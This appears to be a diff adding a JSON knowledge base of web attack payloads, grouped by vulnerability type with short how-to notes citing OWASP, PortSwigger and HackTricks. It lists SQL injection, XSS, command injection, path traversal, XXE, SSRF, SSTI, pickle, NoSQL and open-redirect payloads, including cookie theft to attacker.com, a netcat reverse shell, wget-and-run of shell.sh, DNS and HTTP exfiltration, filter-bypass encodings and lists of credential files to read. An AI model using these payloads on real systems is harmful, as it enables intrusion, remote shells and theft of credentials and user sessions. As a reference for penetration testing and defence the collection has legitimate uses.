@@ -1,0 +1,90 @@
+[
+  {
+    "content": "SQL Injection - Authentication Bypass Payloads:\n- ' OR '1'='1' --\n- ' OR '1'='1' /*\n- admin' --\n- ' OR 1=1 #\n- ' UNION SELECT NULL, username, password FROM users --\n- ') OR ('1'='1\n- ' OR ''='\n- 1' OR '1' = '1\n\nThese payloads exploit string concatenation in SQL queries. The single quote closes the original string context, then OR 1=1 makes the WHERE clause always true. The comment characters (-- or #) neutralize the rest of the query.",
+    "metadata": {"vulnerability_type": "sql_injection", "technique": "authentication_bypass", "source": "OWASP"}
+  },
+  {
+    "content": "SQL Injection - UNION-Based Data Extraction:\n- ' UNION SELECT NULL --\n- ' UNION SELECT NULL, NULL --\n- ' UNION SELECT username, password FROM users --\n- ' UNION SELECT table_name, NULL FROM information_schema.tables --\n- ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --\n- 0 UNION SELECT ALL FROM users WHERE 1=1 --\n\nUNION attacks append additional SELECT results. First determine column count by adding NULL columns. Then extract data from other tables. The information_schema tables reveal database structure.",
+    "metadata": {"vulnerability_type": "sql_injection", "technique": "union_extraction", "source": "PortSwigger"}
+  },
+  {
+    "content": "SQL Injection - Blind Boolean-Based:\n- ' AND 1=1 -- (returns normal page)\n- ' AND 1=2 -- (returns different/error page)\n- ' AND (SELECT COUNT(*) FROM users) > 0 --\n- ' AND SUBSTRING(username,1,1)='a' FROM users WHERE id=1 --\n- ' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 64 --\n\nBlind SQLi extracts data one bit at a time by observing page differences. Boolean-based checks if conditions are true/false. Use binary search on ASCII values to extract characters efficiently.",
+    "metadata": {"vulnerability_type": "sql_injection", "technique": "blind_boolean", "source": "OWASP"}
+  },
+  {
+    "content": "SQL Injection - Time-Based Blind:\n- ' AND SLEEP(5) --\n- ' OR IF(1=1, SLEEP(5), 0) --\n- '; WAITFOR DELAY '0:0:5' --\n- ' AND (SELECT * FROM (SELECT SLEEP(5))t) --\n- ' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND SLEEP(5)) --\n\nTime-based blind SQLi uses database sleep functions to infer data. If the response is delayed, the condition was true. Works when no visible output difference exists. MySQL uses SLEEP(), MSSQL uses WAITFOR DELAY, PostgreSQL uses pg_sleep().",
+    "metadata": {"vulnerability_type": "sql_injection", "technique": "blind_time", "source": "OWASP"}
+  },
+  {
+    "content": "SQL Injection - WAF/Filter Bypass Techniques:\n- Case alternation: sElEcT, UnIoN\n- Whitespace alternatives: UNION/**/SELECT, UNION%0aSELECT\n- URL encoding: %27 (single quote), %23 (#), %2D%2D (--)\n- Double URL encoding: %2527\n- Null byte: %00' OR 1=1\n- Inline comments: /*!UNION*/ /*!SELECT*/\n- Concat: CONCAT(0x27, 0x4F52, 0x27)\n- Hex encoding: 0x61646d696e (admin)\n\nWhen basic payloads are blocked, encoding and obfuscation can bypass WAF rules. Try each technique systematically.",
+    "metadata": {"vulnerability_type": "sql_injection", "technique": "waf_bypass", "source": "HackTricks"}
+  },
+  {
+    "content": "XSS - Reflected XSS Payloads:\n- <script>alert('XSS')</script>\n- <img src=x onerror=alert(1)>\n- <svg/onload=alert(1)>\n- <body onload=alert(1)>\n- <input onfocus=alert(1) autofocus>\n- <marquee onstart=alert(1)>\n- <details open ontoggle=alert(1)>\n- <video><source onerror=alert(1)>\n\nReflected XSS occurs when user input is echoed back in the response without sanitization. Test each input field and URL parameter. Try HTML tags with event handlers when script tags are blocked.",
+    "metadata": {"vulnerability_type": "xss", "technique": "reflected", "source": "OWASP"}
+  },
+  {
+    "content": "XSS - Filter Bypass Techniques:\n- Case variations: <ScRiPt>alert(1)</sCrIpT>\n- No quotes: <img src=x onerror=alert(1)>\n- Template literals: <img src=x onerror=alert`1`>\n- Event handlers without script tag: <svg onload=alert(1)>\n- HTML encoding: <img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>\n- JavaScript protocol: <a href=\"javascript:alert(1)\">click</a>\n- Data URI: <object data=\"data:text/html,<script>alert(1)</script>\">\n- SVG in XML: <svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\">\n- Breaking out of attribute: \" onfocus=alert(1) autofocus=\"\n\nWhen basic XSS is blocked, try: different tags, different event handlers, encoding, protocol handlers.",
+    "metadata": {"vulnerability_type": "xss", "technique": "filter_bypass", "source": "PortSwigger"}
+  },
+  {
+    "content": "XSS - Stored/Persistent XSS:\n- Target user-generated content fields: comments, profile bios, usernames, messages\n- Payloads persist in database and execute for every viewer\n- <script>document.location='http://attacker.com/steal?c='+document.cookie</script>\n- <img src=x onerror=\"fetch('http://attacker.com/'+document.cookie)\">\n\nStored XSS is more dangerous than reflected because it affects all users viewing the content. Target any field that gets stored and displayed to other users. Cookie stealing, keylogging, and session hijacking are common exploitation goals.",
+    "metadata": {"vulnerability_type": "xss", "technique": "stored", "source": "OWASP"}
+  },
+  {
+    "content": "Command Injection - Shell Metacharacter Payloads:\n- ; ls -la\n- | cat /etc/passwd\n- `whoami`\n- $(id)\n- && cat /etc/shadow\n- || curl http://attacker.com/$(whoami)\n- ; nc -e /bin/sh attacker.com 4444\n- %0a id\n- $IFS instead of spaces: cat${IFS}/etc/passwd\n- Newline injection: %0aid\n\nCommand injection uses shell metacharacters to append or chain commands. Semicolons (;) separate commands. Pipes (|) redirect output. Backticks and $() enable command substitution. Double ampersand (&&) chains on success.",
+    "metadata": {"vulnerability_type": "command_injection", "technique": "shell_metacharacters", "source": "OWASP"}
+  },
+  {
+    "content": "Command Injection - Blind/Out-of-Band:\n- ; sleep 10 (time-based detection)\n- | ping -c 10 attacker.com (network-based detection)\n- ; curl http://attacker.com/$(whoami) (data exfiltration)\n- ; nslookup $(cat /etc/hostname).attacker.com (DNS exfiltration)\n- ; wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh\n\nWhen command output is not visible, use time delays (sleep), network callbacks (curl/ping/nslookup to attacker-controlled server), or DNS exfiltration to confirm injection. DNS exfiltration embeds data in subdomain queries.",
+    "metadata": {"vulnerability_type": "command_injection", "technique": "blind_oob", "source": "HackTricks"}
+  },
+  {
+    "content": "Command Injection - Filter Bypass:\n- Concatenation: c'a't /etc/passwd\n- Wildcards: cat /etc/pass??\n- Environment variables: $HOME, $PATH\n- Base64 encoding: echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | bash\n- Hex: echo -e '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64' | bash\n- Tab instead of space: ;cat\\t/etc/passwd\n- Brace expansion: {cat,/etc/passwd}\n\nWhen blacklists filter common commands, use shell expansion, encoding, or alternative syntax to bypass restrictions.",
+    "metadata": {"vulnerability_type": "command_injection", "technique": "filter_bypass", "source": "PayloadsAllTheThings"}
+  },
+  {
+    "content": "Path Traversal - Basic Payloads:\n- ../../../etc/passwd\n- ....//....//....//etc/passwd\n- ..\\..\\..\\windows\\system32\\config\\sam\n- %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\n- ..%252f..%252f..%252fetc%252fpasswd (double encoding)\n- %c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd (overlong UTF-8)\n- /var/www/../../etc/passwd\n\nPath traversal escapes the intended directory using ../ sequences. When basic ../ is blocked: try URL encoding, double encoding, overlong UTF-8, null bytes, or OS-specific separators (backslash on Windows).",
+    "metadata": {"vulnerability_type": "path_traversal", "technique": "basic_traversal", "source": "OWASP"}
+  },
+  {
+    "content": "Path Traversal - Interesting Target Files:\n- Linux: /etc/passwd, /etc/shadow, /etc/hosts, /proc/self/environ, /root/.ssh/id_rsa, /root/.bash_history\n- Application: ../../config.yml, ../../.env, ../../database.sqlite, ../../wp-config.php\n- Cloud: /proc/self/environ (may contain AWS keys), /var/run/secrets/kubernetes.io/serviceaccount/token\n\nOnce path traversal is confirmed, target high-value files: credentials, configuration, SSH keys, cloud metadata tokens. /proc/self/environ often contains environment variables with API keys.",
+    "metadata": {"vulnerability_type": "path_traversal", "technique": "target_files", "source": "HackTricks"}
+  },
+  {
+    "content": "XXE - XML External Entity Payloads:\n- <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>\n- <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><data>&xxe;</data>\n- <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]>\n\nXXE exploits XML parsers that process external entity declarations. SYSTEM entities can read local files or make HTTP requests. PHP filter wrappers can base64-encode binary files. Disable external entities (resolve_entities=False) to prevent.",
+    "metadata": {"vulnerability_type": "xxe", "technique": "file_read", "source": "OWASP"}
+  },
+  {
+    "content": "XXE - Blind/Out-of-Band:\n- <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/xxe\">]> (detect via HTTP callback)\n- <!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd;]> (external DTD)\n- evil.dtd: <!ENTITY % data SYSTEM \"file:///etc/passwd\"><!ENTITY % payload \"<!ENTITY &#37; exfil SYSTEM 'http://attacker.com/?d=%data;'>\">%payload;%exfil;\n\nBlind XXE uses out-of-band channels (HTTP/DNS) to exfiltrate data. Host a malicious DTD on attacker server. The DTD reads local files and sends content via HTTP parameter. Works even when XML response is not displayed.",
+    "metadata": {"vulnerability_type": "xxe", "technique": "blind_oob", "source": "PortSwigger"}
+  },
+  {
+    "content": "SSRF - Server-Side Request Forgery Payloads:\n- http://localhost:80 (local web server)\n- http://127.0.0.1:22 (SSH port scan)\n- http://169.254.169.254/latest/meta-data/ (AWS metadata)\n- http://metadata.google.internal/computeMetadata/v1/ (GCP metadata)\n- http://169.254.169.254/metadata/v1.json (DigitalOcean)\n- http://[::]:80 (IPv6 localhost)\n- http://0.0.0.0:80\n- http://0177.0.0.1 (octal localhost)\n- http://2130706433 (decimal localhost)\n\nSSRF makes the server issue requests to internal/cloud resources. Cloud metadata endpoints expose IAM credentials. Use IP format variations to bypass naive localhost checks.",
+    "metadata": {"vulnerability_type": "ssrf", "technique": "cloud_metadata", "source": "OWASP"}
+  },
+  {
+    "content": "SSRF - Filter Bypass Techniques:\n- URL shorteners: https://tinyurl.com/internal-redirect\n- DNS rebinding: Register domain that resolves to 127.0.0.1\n- Open redirect chains: http://allowed.com/redirect?url=http://localhost\n- Decimal IP: http://2130706433 (127.0.0.1 as integer)\n- IPv6: http://[::ffff:127.0.0.1]\n- Enclosed alphanumeric: http://127。0。0。1 (fullwidth dot)\n- URL parsing confusion: http://attacker.com@127.0.0.1\n- Protocol smuggling: gopher://localhost:25/\n\nWhen URL validation blocks obvious patterns, try alternative IP representations, protocol handlers, URL parsing ambiguities, and redirect chains.",
+    "metadata": {"vulnerability_type": "ssrf", "technique": "filter_bypass", "source": "HackTricks"}
+  },
+  {
+    "content": "Insecure Deserialization - Python pickle Payloads:\nimport pickle, os\nclass Exploit(object):\n    def __reduce__(self):\n        return (os.system, ('id',))\npickle.dumps(Exploit())\n\nPython's pickle module executes arbitrary code during deserialization via __reduce__. Never unpickle untrusted data. Use json, yaml.safe_load, or msgpack instead. The __reduce__ method returns a callable and args that get executed during unpickling.",
+    "metadata": {"vulnerability_type": "deserialization", "technique": "pickle_exploit", "source": "OWASP"}
+  },
+  {
+    "content": "NoSQL Injection - MongoDB Payloads:\n- {\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}\n- {\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}\n- {\"username\": {\"$regex\": \"admin\"}, \"password\": {\"$regex\": \".*\"}}\n- {\"username\": \"admin\", \"password\": {\"$exists\": true}}\n- {\"$where\": \"this.username == 'admin'\"}\n- {\"username\": {\"$in\": [\"admin\", \"root\", \"administrator\"]}}\n\nNoSQL injection exploits query operators ($gt, $ne, $regex, $where) in MongoDB and similar databases. When user input is inserted into query objects without validation, operators can manipulate query logic. $where allows arbitrary JavaScript execution.",
+    "metadata": {"vulnerability_type": "nosql_injection", "technique": "mongodb_operators", "source": "OWASP"}
+  },
+  {
+    "content": "SSTI - Server-Side Template Injection Payloads:\n- {{7*7}} → 49 (Jinja2, Twig)\n- ${7*7} → 49 (Mako, FreeMarker)\n- #{7*7} → 49 (Thymeleaf)\n- Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n- Jinja2 RCE: {{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}\n- Mako: <%import os%>${os.popen('id').read()}\n\nSSTI occurs when user input is embedded in template strings and processed by the template engine. Test with {{7*7}} first to confirm injection. Then escalate to RCE via Python object introspection chains (__class__.__mro__). render_template_string() in Flask/Jinja2 is a common sink.",
+    "metadata": {"vulnerability_type": "ssti", "technique": "template_rce", "source": "HackTricks"}
+  },
+  {
+    "content": "IDOR - Insecure Direct Object Reference:\n- Change user_id parameter: /api/users/123 → /api/users/124\n- Increment resource IDs: /api/orders/1001 → /api/orders/1002\n- UUID guessing: Try sequential or predictable UUIDs\n- Parameter pollution: /api/users?id=123&id=456\n- HTTP method switching: GET /api/users/123 works, try DELETE /api/users/456\n\nIDOR occurs when the application uses user-supplied identifiers to access objects without authorization checks. Test by creating two accounts and trying to access each other's resources. Check all CRUD endpoints. APIs with numeric sequential IDs are most vulnerable.",
+    "metadata": {"vulnerability_type": "idor", "technique": "parameter_manipulation", "source": "OWASP"}
+  },
+  {
+    "content": "Open Redirect Payloads:\n- //evil.com\n- /\\evil.com\n- https://evil.com\n- //evil%2Ecom\n- ///evil.com/%2F..\n- //evil.com/%2e%2e\n- ?next=http://evil.com\n- ?redirect=//evil.com\n- ?url=https://evil.com@legitimate.com\n- javascript:alert(1)//\n\nOpen redirect occurs when the application redirects to user-controlled URLs without validation. Used in phishing (redirect from trusted domain to attacker site) and OAuth token theft. Bypass domain checks with URL parsing confusion, double slashes, and @ symbols.",
+    "metadata": {"vulnerability_type": "open_redirect", "technique": "redirect_bypass", "source": "OWASP"}
+  }
+]
